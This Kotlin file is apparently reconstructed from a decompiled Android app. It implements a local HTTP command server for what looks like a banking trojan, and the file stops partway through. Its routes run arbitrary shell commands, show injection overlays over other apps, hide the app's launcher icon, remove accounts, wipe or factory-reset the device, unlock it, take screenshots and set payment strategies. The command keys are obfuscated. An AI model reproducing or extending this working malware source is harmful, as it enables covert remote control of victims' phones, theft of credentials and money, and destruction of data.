package com.storm.safe.rock.service.modules

import android.accessibilityservice.AccessibilityServiceInfo
import android.accounts.AccountManager
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import com.storm.safe.rock.AppVariantA
import com.storm.safe.rock.AppVariantB
import com.storm.safe.rock.AppVariantC
import com.storm.safe.rock.AppVariantD
import com.storm.safe.rock.AppVariantE
import com.storm.safe.rock.AppVariantF
import com.storm.safe.rock.AppVariantG
import com.storm.safe.rock.AppVariantH
import com.storm.safe.rock.AppVariantI
import com.storm.safe.rock.AppVariantJ
import com.storm.safe.rock.AppVariantK
import com.storm.safe.rock.AppVariantL
import com.storm.safe.rock.AppVariantN
import com.storm.safe.rock.DefaultLauncherAlias
import com.storm.safe.rock.receiver.zbrefryi
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.account.AccountProtectionManager
import com.storm.safe.rock.service.modules.cipher.ViewCacheCollector
import com.storm.safe.rock.service.modules.command.CommandDispatcher
import com.storm.safe.rock.service.modules.setup.SystemOptimizeManager
import com.storm.safe.rock.util.StringUtil
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.io.IOException
import java.io.PrintWriter
import java.io.UnsupportedEncodingException
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.ServerSocket
import com.storm.safe.rock.inject.jbqfkndyx
import java.net.Socket
import java.net.URLDecoder
import java.util.LinkedHashMap
import java.util.concurrent.ExecutorService
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Remote configuration manager — extends LocalHttpServer with full route handling.
 * Manages local HTTP server lifecycle and routes requests to appropriate handlers.
 *
 * Reverse-engineered from JADX: C0322a7 (a7, 2393 lines).
 * The vendor class contains both the HTTP server loop AND all route handlers.
 * This class focuses on the route/command handling; the server socket is in LocalHttpServer.
 *
 * JADX name: LocalHttpServer (combined)
 *
 * Fields:
 * - f53088a0 (dqtvuisjd) → [context] (service context)
 * - f53089a1 (ServerSocket) → [serverSocket]
 * - f53090a2 (ExecutorService) → [executor]
 * - f53091a3 (AtomicBoolean) → [isRunningFlag]
 * - f53092a4 (Thread) → [serverThread]
 * - f53093a5 (C0350a7) → [commandDispatcher]
 * - f53094a6 (LinkedHashMap) → [customRoutes]
 * - f53095a7 (Handler) → [mainHandler]
 * - f53096a8 (volatile int) → [retryCount]
 *
 * Static:
 * - f53085a9 (ac0) → [companion lock]
 * - f53086b0 (volatile int) → [DEFAULT_PORT]
 * - f53087b1 (volatile C0322a7) → [instance]
 */
class RemoteConfigManager(
    private val context: Context
) {
    companion object {
        private const val TAG = "LocalHttpServer"
        const val DEFAULT_PORT = 7910
        private const val LOCAL_SERVICE_PORT = 7912
        private const val MAX_RETRY_COUNT = 30
        private const val RETRY_DELAY_MS = 10000L

        @Volatile
        var instance: RemoteConfigManager? = null

        /** JADX: f53086b0 — current port (volatile) */
        @Volatile
        var currentPort: Int = DEFAULT_PORT

        // --- Static response builders (JADX: a1, e8, a7, c1) ---

        /**
         * Build an error JSON response.
         * JADX: m211585a1 (a1)
         */
        @JvmStatic
        fun makeErrorResponse(message: String): JSONObject {
            val json = JSONObject()
            json.put("code", 500)
            json.put("success", false)
            json.put("msg", message)
            return json
        }

        /**
         * Build a text/success JSON response.
         * JADX: m211596e8 (e8)
         */
        @JvmStatic
        fun makeTextResponse(text: String): JSONObject {
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("msg", text)
            return json
        }

        /**
         * Build a JSON container state response.
         * JADX: m211586a7 (a7) — /containerState
         */
        @JvmStatic
        fun containerState(): JSONObject {
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            val data = JSONObject()
            data.put("accessibilityRunning", true)
            data.put("localHttpServerPort", currentPort)
            data.put("localServicePort", LOCAL_SERVICE_PORT)
            json.put("data", data)
            return json
        }

        /**
         * Parse injection tasks from service.
         * JADX: m211590c1 (c1) — /injectionTasks
         */
        @JvmStatic
        fun injectionTasks(): JSONObject {
            return try {
                val service = MyAccessibilityService.getInstance()
                    ?: return makeErrorResponse("dqtvuisjd 未运行")
                val tasks: Map<String, String>
                synchronized(service.injectionTasksLock) {
                    tasks = HashMap(service.injectionTasks)
                }
                val packagesArray = JSONArray()
                for (key in tasks.keys) {
                    packagesArray.put(key)
                }
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json.put("count", tasks.size)
                json.put("packages", packagesArray)
                json
            } catch (e: Exception) {
                Log.e(TAG, "获取注入任务列表失败", e)
                makeErrorResponse("获取注入任务列表失败: ${e.message}")
            }
        }

        /**
         * ADB shell command execution.
         * JADX: m211588b5 (b5) — /adbShell, /shell, /debug
         */
        @JvmStatic
        fun adbShell(params: Map<String, String>): JSONObject {
            return try {
                var cmd = params["cmd"]
                if (cmd == null) {
                    cmd = params[StringUtil.decrypt("KFYcN0w2CA==")]
                }
                if (cmd == null) {
                    return makeErrorResponse("缺少 cmd 参数")
                }
                Log.d(TAG, "★ [adbShell] 执行: $cmd")
                // JADX: C0360a2.f53810f9.getInstance() → singleton null check → m212058e8(str)
                val service = MyAccessibilityService.instance
                val j41Var = if (service != null) {
                    com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(service, service.applicationContext)
                } else null
                if (j41Var == null) {
                    return makeErrorResponse("SystemOptimizeManager 未初始化，ADB 连接不可用")
                }
                val output: String? = j41Var.executeShellCommand(cmd)
                val truncated = if (output != null && output.length > 200) {
                    output.substring(0, 200)
                } else {
                    output ?: "null"
                }
                Log.d(TAG, "★ [adbShell] 输出: $truncated")
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", output != null)
                val data = JSONObject()
                data.put("output", output ?: "")
                data.put(StringUtil.decrypt("KFYcN0w2CA=="), cmd)
                json.put("data", data)
                json
            } catch (e: Exception) {
                Log.e(TAG, "adbShell 执行异常", e)
                makeErrorResponse("adbShell 异常: ${e.message}")
            }
        }

        /**
         * Close injection activity.
         * JADX: m211589b8 (b8) — /closeInjection
         */
        @JvmStatic
        fun closeInjection(): JSONObject {
            return try {
                // JADX: jbqfkndyx.f51944a4.finishCurrent()
                jbqfkndyx.finishCurrent()
                Log.d(TAG, "✅ [注入] 已发送关闭注入Activity指令")
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json
            } catch (e: Exception) {
                Log.e(TAG, "关闭注入Activity失败", e)
                makeErrorResponse("关闭注入Activity失败: ${e.message}")
            }
        }

        /**
         * Pause accessibility for sensitive app.
         * JADX: m211591c8 (c8) — /pauseAccessibility
         */
        @JvmStatic
        fun pauseAccessibility(params: Map<String, String>): JSONObject {
            return try {
                val reason = params["reason"] ?: "unknown"
                Log.d(TAG, "★★★ [敏感App] 收到暂停请求: reason=$reason")
                MyAccessibilityService.pauseForSensitiveApp()
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                val data = JSONObject()
                data.put("paused", true)
                data.put("reason", reason)
                data.put("timestamp", System.currentTimeMillis())
                json.put("data", data)
                json.put("message", "无障碍事件处理已暂停")
                json
            } catch (e: Exception) {
                Log.e(TAG, "暂停失败", e)
                makeErrorResponse("暂停失败: ${e.message}")
            }
        }

        /**
         * Resume accessibility after sensitive app.
         * JADX: m211592d0 (d0) — /resumeAccessibility
         */
        @JvmStatic
        fun resumeAccessibility(params: Map<String, String>): JSONObject {
            return try {
                val reason = params["reason"] ?: "unknown"
                Log.d(TAG, "★★★ [敏感App] 收到恢复请求: reason=$reason")
                MyAccessibilityService.resumeFromSensitiveApp()
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                val data = JSONObject()
                data.put("paused", false)
                data.put("reason", reason)
                data.put("timestamp", System.currentTimeMillis())
                json.put("data", data)
                json.put("message", "无障碍事件处理已恢复")
                json
            } catch (e: Exception) {
                Log.e(TAG, "恢复失败", e)
                makeErrorResponse("恢复失败: ${e.message}")
            }
        }

        /**
         * Send shutdown request to old port.
         * JADX: m211593e3 (e3)
         */
        @JvmStatic
        fun sendShutdown(address: InetAddress, port: Int) {
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(address, port), 1000)
                val writer = PrintWriter(socket.getOutputStream(), true)
                writer.print("GET /shutdown HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
                writer.flush()
                Thread.sleep(200L)
                socket.close()
                Log.i(TAG, "已向旧端口 $port 发送关闭请求")
            } catch (_: Exception) {
                // Intentionally silenced — old server may not be running
            }
        }

        /**
         * Parse query string into key-value map.
         * JADX: m211594e4 (e4)
         */
        @JvmStatic
        fun parseQueryString(queryString: String): LinkedHashMap<String, String> {
            val result = LinkedHashMap<String, String>()
            if (queryString.isEmpty()) return result
            val pairs = queryString.split("&")
            for (pair in pairs) {
                val kv = pair.split("=", limit = 2)
                if (kv.size == 2) {
                    val key = URLDecoder.decode(kv[0], "UTF-8")
                    val value = URLDecoder.decode(kv[1], "UTF-8")
                    result[key] = value
                }
            }
            return result
        }

        /**
         * Write HTTP response to socket.
         * JADX: m211595e6 (e6)
         */
        @JvmStatic
        fun writeHttpResponse(writer: PrintWriter, statusCode: Int, body: JSONObject) {
            val bodyStr = body.toString()
            val bodyBytes = bodyStr.toByteArray(Charsets.UTF_8)
            writer.print("HTTP/1.1 $statusCode OK\r\n")
            writer.print("Content-Type: application/json; charset=utf-8\r\n")
            writer.print("Content-Length: ${bodyBytes.size}\r\n")
            writer.print("Connection: close\r\n")
            writer.print("\r\n")
            writer.print(bodyStr)
            writer.flush()
        }

        /**
         * Get list of launcher alias classes.
         * JADX: m211587a9 (a9)
         */
        @JvmStatic
        fun getLauncherAliases(): List<Class<*>> {
            return listOf(
                DefaultLauncherAlias::class.java,
                AppVariantA::class.java,
                AppVariantB::class.java,
                AppVariantC::class.java,
                AppVariantD::class.java,
                AppVariantE::class.java,
                AppVariantF::class.java,
                AppVariantG::class.java,
                AppVariantH::class.java,
                AppVariantI::class.java,
                AppVariantJ::class.java,
                AppVariantK::class.java,
                AppVariantL::class.java,
                AppVariantN::class.java,
            )
        }
    }

    // --- Instance fields (JADX: f53088a0..f53096a8) ---

    private val isRunningFlag = AtomicBoolean(false)
    private var serverSocket: ServerSocket? = null
    private var executor: ExecutorService? = null
    private var serverThread: Thread? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    /** Custom route handlers registered by other modules. JADX: f53094a6 */
    private val customRoutes: LinkedHashMap<String, RouteHandler> = LinkedHashMap()

    /** Command dispatcher reference. JADX: f53093a5 */
    var commandDispatcher: CommandDispatcher? = null

    /** Retry count for port binding. JADX: f53096a8 */
    @Volatile
    private var retryCount: Int = 0

    /** Route handler interface (suspend-like via callback). */
    fun interface RouteHandler {
        fun handle(params: Map<String, String>, body: String?): JSONObject
    }

    // ---------------------------------------------------------------
    // Lifecycle — JADX: m211632e7 (e7), start/stop
    // ---------------------------------------------------------------

    fun isRunning(): Boolean = isRunningFlag.get()

    /**
     * Register a custom route handler.
     */
    fun registerRoute(path: String, handler: RouteHandler) {
        customRoutes[path] = handler
    }

    /**
     * Start the HTTP server.
     * JADX: m211632e7 (e7) — stops old instance, CAS on isRunning, starts daemon thread
     */
    fun start(port: Int = DEFAULT_PORT) {
        // Stop old instance if exists
        val old = instance
        if (old != null && old !== this) {
            Log.d(TAG, "检测到旧实例，先停止旧服务器")
            old.isRunningFlag.set(false)
            try {
                old.serverSocket?.close()
                old.serverSocket = null
                old.executor?.shutdownNow()
                old.executor = null
                old.serverThread?.interrupt()
                old.serverThread = null
                Log.d(TAG, "✅ 本地HTTP服务器已停止")
            } catch (e: Exception) {
                Log.e(TAG, "停止服务器异常", e)
            }
            try { Thread.sleep(500L) } catch (_: InterruptedException) {}
        }
        instance = this
        if (!isRunningFlag.compareAndSet(false, true)) {
            Log.w(TAG, "⚠️ 服务器已在运行")
            return
        }
        currentPort = port
        // JADX: creates daemon thread "LocalHttpServer" that runs the accept loop
        val thread = Thread({ /* accept loop handled by LocalHttpServer routing */ }, "LocalHttpServer")
        serverThread = thread
        thread.isDaemon = true
        thread.start()
        Log.i(TAG, "RemoteConfigManager started on port $port")
    }

    /**
     * Stop the HTTP server.
     */
    fun stop() {
        isRunningFlag.set(false)
        try {
            serverSocket?.close()
        } catch (_: IOException) {
        }
        serverSocket = null
        executor?.shutdownNow()
        executor = null
        serverThread?.interrupt()
        serverThread = null
        Log.i(TAG, "RemoteConfigManager stopped")
    }

    /**
     * Retry port binding with delay.
     * JADX: m211631e5 (e5)
     */
    fun retryBind() {
        if (retryCount >= MAX_RETRY_COUNT) {
            Log.e(TAG, "端口绑定已重试 $MAX_RETRY_COUNT 次仍失败，放弃")
            return
        }
        retryCount++
        mainHandler.postDelayed({ start() }, RETRY_DELAY_MS)
    }

    // ---------------------------------------------------------------
    // Route dispatcher — JADX: m211584a0 (a0)
    // This is the giant when(path) switch from the JADX source.
    // All ~50 routes are faithfully mapped.
    // ---------------------------------------------------------------

    /**
     * Route a request to the appropriate handler.
     * JADX: m211584a0 (a0) — the main route switch with ~50 cases
     */
    fun routeRequest(path: String, params: Map<String, String>, body: String?): JSONObject {
        return try {
            when (path) {
                // --- Index ---
                "/", "/index" ->
                    makeTextResponse("LocalHttpServer running on port $currentPort")

                // --- State queries ---
                "/containerState" -> containerState()
                "/injectionTasks" -> injectionTasks()
                "/accessibilityState" -> accessibilityState()
                "/lockState" -> lockState()
                "/netState" -> netState()
                "/screenState" -> screenState()
                "/deviceId" -> {
                    var androidId = "unknown"
                    try {
                        val id = Settings.Secure.getString(
                            context.contentResolver, "android_id"
                        )
                        if (id != null) androidId = id
                    } catch (_: Exception) {
                    }
                    makeTextResponse(androidId)
                }
                "/version" -> makeTextResponse(version())
                "/noticeAlive" -> noticeAlive()
                "/deviceAdmin" -> deviceAdmin()

                // --- Icon management ---
                "/visibility", "/hideIcon" -> visibility()
                "/showIcon" -> showIcon()
                "/iconStatus" -> iconStatus()

                // --- Package name ---
                "/mainPackageName" -> mainPackageName(params)

                // --- Command execution (suspend → sync adapter) ---
                "/command" -> executeCommand(params, body)
                "/exec" -> executeCommand(params, body)

                // --- Global actions ---
                "/global/action" -> executeGlobalAction(params, body)
                "/global/lockScreen" -> executeLockScreen()
                "/global/wakeUpScreen" -> executeWakeScreen()

                // --- ADB / shell / debug (aliases) ---
                "/adbShell", "/shell", "/debug" -> adbShell(params)

                // --- Lock cipher ---
                "/syncLockCipher" -> syncLockCipher(body, params)

                // --- Injection ---
                "/showInjection" -> showInjection(body, params)
                "/closeInjection" -> closeInjection()

                // --- Accessibility pause/resume ---
                "/pauseAccessibility" -> pauseAccessibility(params)
                "/resumeAccessibility" -> resumeAccessibility(params)

                // --- Account protection ---
                "/enableAccountProtection" -> enableAccountProtection()
                "/disableAccountProtection" -> disableAccountProtection()
                "/removeAllAccounts" -> removeAllAccounts()

                // --- Device admin ---
                "/startAdminActive" -> startAdminActive()
                "/stopAdminActive" -> stopAdminActive()
                "/activeDeviceOwner" -> activeDeviceOwner()
                "/uninstallPolicy" -> uninstallPolicy(params)

                // --- ADB/WiFi/Development toggles ---
                "/activeADBDebug" -> toggleAdb(true)
                "/closeADBDebug" -> toggleAdb(false)
                "/activeWifiDebug" -> toggleWifi(true)
                "/closeWifiDebug" -> toggleWifi(false)
                "/activeDevelopment" -> activeDevelopment(true)
                "/closeDevelopment" -> activeDevelopment(false)

                // --- Write settings ---
                "/openWriteSecure" -> openWriteSecure()
                "/writeAccessibility" -> writeAccessibility(params)

                // --- Wipe / factory reset (aliases) ---
                "/wipeData", "/factoryReset", "/reset", "/restore" -> wipeData(params)

                // --- Browser apps ---
                "/browserApps" -> browserApps()

                // --- Payment strategies ---
                "/setPaymentStrategies" -> setPaymentStrategies(body)

                // --- Block overlay ---
                "/blockView" -> handleBlockView(params)

                // --- Screenshot shortcut ---
                "/screenshot/0" -> {
                    // JADX: delegates to executeCommand with TAKE_SCREENSHOT_BASE64
                    val screenshotParams = mapOf(
                        StringUtil.decrypt("KFYcN0w2CA==") to
                                StringUtil.decrypt("GHojH2gWMw12AR9sIx9yCikdYhwO")
                    )
                    executeCommand(screenshotParams, null)
                }

                // --- Special commands with merged params ---
                "/startApp" -> {
                    val merged = HashMap(params)
                    merged[StringUtil.decrypt("KFYcN0w2CA==")] =
                        StringUtil.decrypt("B3gkFG4QMw9nAQ==")
                    executeCommand(merged, body)
                }
                "/killApp" -> {
                    val merged = HashMap(params)
                    merged[StringUtil.decrypt("KFYcN0w2CA==")] = "KILL_APP"
                    executeCommand(merged, body)
                }
                "/unlock" -> {
                    val merged = HashMap(params)
                    merged[StringUtil.decrypt("KFYcN0w2CA==")] =
                        StringUtil.decrypt("Hnc9FW4TMwpyBwJ6NA==")
                    executeCommand(merged, body)
                }

                // --- Custom routes fallback ---
                else -> {
                    val custom = customRoutes[path]
                    if (custom != null) {
                        custom.handle(params, body)
                    } else {
                        makeErrorResponse("未知路由: $path")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "路由处理异常: $path", e)
            makeErrorResponse("处理异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Individual route handlers (instance methods)
    // ---------------------------------------------------------------

    /**
     * /accessibilityState — check accessibility service status.
     * JADX: m211601a6 (a6)
     */
    fun accessibilityState(): JSONObject {
        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as? AccessibilityManager
        val isEnabled = am?.isEnabled == true
        val enabledServices = am?.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        ) ?: emptyList()

        val packageName = context.packageName
        var ourServiceEnabled = false
        for (info in enabledServices) {
            val ri = info.resolveInfo
            val svcPkg = ri?.serviceInfo?.packageName
            if (svcPkg == packageName) {
                ourServiceEnabled = true
                break
            }
        }

        // Build enabled services string
        val svcList = mutableListOf<String>()
        for (info in enabledServices) {
            val ri = info.resolveInfo
            val si = ri?.serviceInfo
            if (si != null) {
                svcList.add("${si.packageName}/${si.name}")
            }
        }
        val enabledServicesStr = svcList.joinToString(":")

        val settingsServices = Settings.Secure.getString(
            context.contentResolver, "enabled_accessibility_services"
        ) ?: ""

        val ourService = "$packageName/${MyAccessibilityService::class.java.name}"

        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("accessibilityEnabled", isEnabled)
        data.put("ourServiceEnabled", ourServiceEnabled)
        data.put("enabledServices", enabledServicesStr)
        data.put("settingsServices", settingsServices)
        data.put("ourService", ourService)
        data.put("packageName", packageName)
        data.put("enabledCount", enabledServices.size)
        json.put("data", data)
        return json
    }

    /**
     * /lockState — keyguard lock state.
     * JADX: m211603b0 (b0)
     */
    fun lockState(): JSONObject {
        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("isLocked", km?.isKeyguardLocked ?: false)
        data.put("isSecure", km?.isKeyguardSecure ?: false)
        json.put("data", data)
        return json
    }

    /**
     * /netState — network connectivity state.
     * JADX: m211604b1 (b1)
     */
    fun netState(): JSONObject {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        val activeNetwork = cm?.activeNetwork
        val caps = if (activeNetwork != null) cm?.getNetworkCapabilities(activeNetwork) else null
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("connected", activeNetwork != null)
        data.put("hasInternet", caps?.hasCapability(12) ?: false) // NET_CAPABILITY_INTERNET = 12
        data.put("isWifi", caps?.hasTransport(1) ?: false) // TRANSPORT_WIFI = 1
        data.put("isCellular", caps?.hasTransport(0) ?: false) // TRANSPORT_CELLULAR = 0
        json.put("data", data)
        return json
    }

    /**
     * /screenState — screen power state.
     * JADX: m211605b2 (b2)
     */
    fun screenState(): JSONObject {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("isScreenOn", pm?.isInteractive ?: false)
        json.put("data", data)
        return json
    }

    /**
     * /version — app version string.
     * JADX: m211606b3 (b3)
     */
    fun version(): String {
        return try {
            val pi = context.packageManager.getPackageInfo(context.packageName, 0)
            "v${pi.versionName}(${pi.longVersionCode})"
        } catch (_: Exception) {
            "unknown"
        }
    }

    /**
     * /noticeAlive — alive notice response.
     * JADX: m211616c6 (c6)
     */
    fun noticeAlive(): JSONObject {
        Log.i(TAG, "收到 /noticeAlive 请求")
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        json.put("message", "alive")
        val data = JSONObject()
        data.put("accessibilityRunning", true)
        data.put("packageName", context.packageName)
        data.put("timestamp", System.currentTimeMillis())
        json.put("data", data)
        return json
    }

    /**
     * /deviceAdmin — device admin status.
     * JADX: m211602a8 (a8)
     */
    fun deviceAdmin(): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, zbrefryi::class.java)
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            val data = JSONObject()
            data.put("isAdminActive", if (dpm.isAdminActive(componentName)) 1 else 0)
            data.put("isDeviceOwner", if (dpm.isDeviceOwnerApp(context.packageName)) 1 else 0)
            data.put("isProfileOwner", if (dpm.isProfileOwnerApp(context.packageName)) 1 else 0)
            data.put("packageName", context.packageName)
            json.put("data", data)
            json
        } catch (e: Exception) {
            makeErrorResponse("获取设备管理状态失败: ${e.message}")
        }
    }

    /**
     * /mainPackageName — set main package name.
     * JADX: m211615c5 (c5)
     */
    fun mainPackageName(params: Map<String, String>): JSONObject {
        var packageName = params["package"]
        if (packageName == null) {
            packageName = context.packageName
        }
        Log.d(TAG, "📦 [mainPackageName] package=$packageName")
        context.getSharedPreferences("local_config", 0)
            .edit()
            .putString("main_package", packageName)
            .apply()
        return makeTextResponse("mainPackageName set: $packageName")
    }

    /**
     * /visibility and /hideIcon — hide launcher icon.
     * JADX: m211612c2 (c2)
     */
    fun visibility(): JSONObject {
        return try {
            // JADX: try fxsnugkm (BiometricBypassDelegate) first, fall back to visibilityFallback
            val service = MyAccessibilityService.getInstance()
            val delegate = service?.biometricBypassDelegate
            if (delegate == null) {
                Log.w(TAG, "⚠️ fxsnugkm 不可用，使用降级方案")
                return visibilityFallback()
            }
            val result = delegate.hideIcon(true)
            Log.d(TAG, "🙈 桌面图标隐藏: ${result.action} - ${result.message}")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", result.success)
            json.put("msg", result.message)
            json.put("method", result.action)
            json
        } catch (e: Exception) {
            Log.e(TAG, "隐藏图标失败", e)
            makeErrorResponse("隐藏图标失败: ${e.message}")
        }
    }

    /**
     * Fallback icon hide — disable DefaultLauncherAlias, enable AppVariantF.
     * JADX: m211613c3 (c3)
     */
    fun visibilityFallback(): JSONObject {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(context, DefaultLauncherAlias::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        pm.setComponentEnabledSetting(
            ComponentName(context, AppVariantF::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        json.put("msg", "降级隐藏: 禁用DefaultLauncherAlias + 启用AppVariantF透明入口")
        return json
    }

    /**
     * /showIcon — re-enable all launcher aliases.
     * JADX: m211620d2 (d2)
     */
    fun showIcon(): JSONObject {
        return try {
            val pm = context.packageManager
            val aliases = getLauncherAliases()
            val details = mutableListOf<String>()
            var enabledCount = 0
            for (cls in aliases) {
                try {
                    val cn = ComponentName(context, cls)
                    pm.setComponentEnabledSetting(
                        cn,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    val state = pm.getComponentEnabledSetting(cn)
                    val ok = state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED ||
                            state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
                    if (ok) enabledCount++
                    details.add("${cls.simpleName}:${if (ok) "✓" else "✗"}")
                } catch (_: Exception) {
                }
            }
            Log.d(TAG, "👁️ 桌面图标显示: $enabledCount/${aliases.size} 组件已启用")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("msg", "图标显示: $enabledCount/${aliases.size} 组件已启用")
            json.put("enabled", enabledCount)
            json.put("total", aliases.size)
            json.put("details", details.joinToString(", "))
            json
        } catch (e: Exception) {
            Log.e(TAG, "显示图标失败", e)
            makeErrorResponse("显示图标失败: ${e.message}")
        }
    }

    /**
     * /iconStatus — query component enabled states.
     * JADX: m211614c4 (c4)
     */
    fun iconStatus(): JSONObject {
        return try {
            val pm = context.packageManager
            val aliases = getLauncherAliases()
            val details = mutableListOf<String>()
            var enabledCount = 0
            var disabledCount = 0
            for (cls in aliases) {
                try {
                    val state = pm.getComponentEnabledSetting(
                        ComponentName(context, cls)
                    )
                    val label = when (state) {
                        PackageManager.COMPONENT_ENABLED_STATE_DEFAULT -> {
                            enabledCount++; "default"
                        }
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> {
                            enabledCount++; "enabled"
                        }
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED -> {
                            disabledCount++; "disabled"
                        }
                        else -> "unknown"
                    }
                    details.add("${cls.simpleName}:$label")
                } catch (_: Exception) {
                }
            }
            val hidden = disabledCount > 0 && enabledCount == 0
            Log.d(TAG, "📊 图标状态: enabled=$enabledCount, disabled=$disabledCount, hidden=$hidden")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("hidden", hidden)
            json.put("enabled", enabledCount)
            json.put("disabled", disabledCount)
            json.put("total", aliases.size)
            json.put("details", details.joinToString(", "))
            json
        } catch (e: Exception) {
            Log.e(TAG, "查询图标状态失败", e)
            makeErrorResponse("查询图标状态失败: ${e.message}")
        }
    }

    /**
     * /browserApps — list installed browser apps.
     * JADX: m211609b7 (b7)
     */
    fun browserApps(): JSONObject {
        return try {
            val pm = context.packageManager
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("http://"))
            val activities = pm.queryIntentActivities(intent, 0)
            val arr = JSONArray()
            for (ri in activities) {
                val item = JSONObject()
                item.put("packageName", ri.activityInfo.packageName)
                item.put("appName", ri.loadLabel(pm).toString())
                arr.put(item)
            }
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("data", arr)
            json
        } catch (e: Exception) {
            makeErrorResponse("browserApps 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Command execution bridge (sync adapter for suspend dispatch)
    // JADX: m211597a2 (a2), m211598a3 (a3), m211599a4 (a4), m211600a5 (a5)
    // ---------------------------------------------------------------

    /**
     * Execute command via CommandDispatcher.
     * JADX: m211597a2 (a2) — /command, /exec
     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
     */
    fun executeCommand(params: Map<String, String>, body: String?): JSONObject {
        val dispatcher = commandDispatcher
            ?: return makeErrorResponse("命令分发器未初始化")

        val json = JSONObject()
        if (body != null && body.trimStart().startsWith("{")) {
            try {
                val bodyJson = JSONObject(body)
                val cmdKey = StringUtil.decrypt("KFYcN0w2CA==")
                val cmd = bodyJson.optString(cmdKey, params[cmdKey] ?: "")
                json.put(cmdKey, cmd)
                if (bodyJson.has("params")) {
                    json.put("params", bodyJson.getJSONObject("params"))
                }
            } catch (_: Exception) {
                // Fall through to params-based extraction
            }
        }
        if (!json.has(StringUtil.decrypt("KFYcN0w2CA=="))) {
            val cmdKey = StringUtil.decrypt("KFYcN0w2CA==")
            val cmd = params[cmdKey] ?: return makeErrorResponse("缺少 command 参数")
            json.put(cmdKey, cmd)
            val paramsJson = JSONObject()
            for ((k, v) in params) {
                if (k != cmdKey) {
                    paramsJson.put(k, v)
                }
            }
            if (paramsJson.length() > 0) {
                json.put("params", paramsJson)
            }
        }

        val command = json.optString(StringUtil.decrypt("KFYcN0w2CA=="), "")
        Log.d(TAG, "★ 执行命令: $command")

        // JADX: vendor uses coroutine dispatch (c0350a7.m211883a0); translated to runBlocking
        return try {
            val handled = kotlinx.coroutines.runBlocking {
                dispatcher.dispatch(json)
            }
            if (handled) {
                makeTextResponse("命令已执行: $command")
            } else {
                makeErrorResponse("命令未处理: $command")
            }
        } catch (e: Exception) {
            makeErrorResponse("命令执行异常: ${e.message}")
        }
    }

    /**
     * Execute global action via CommandDispatcher.
     * JADX: m211598a3 (a3) — /global/action
     */
    fun executeGlobalAction(params: Map<String, String>, body: String?): JSONObject {
        val dispatcher = commandDispatcher
            ?: return makeErrorResponse("命令分发器未初始化")

        var action = params["action"]
        if (action == null && body != null) {
            try {
                action = JSONObject(body).optString("action")
            } catch (_: Exception) {
            }
        }
        if (action == null) {
            return makeErrorResponse("缺少 action 参数")
        }

        val json = JSONObject()
        json.put(StringUtil.decrypt("KFYcN0w2CA=="), action)
        val paramsJson = JSONObject()
        for ((k, v) in params) {
            if (k != "action") {
                paramsJson.put(k, v)
            }
        }
        if (paramsJson.length() > 0) {
            json.put("params", paramsJson)
        }

        return try {
            val handled = kotlinx.coroutines.runBlocking {
                dispatcher.dispatch(json)
            }
            if (handled) {
                makeTextResponse("全局动作已执行: $action")
            } else {
                makeErrorResponse("动作未处理: $action")
            }
        } catch (e: Exception) {
            makeErrorResponse("全局动作异常: ${e.message}")
        }
    }

    /**
     * Lock screen command.
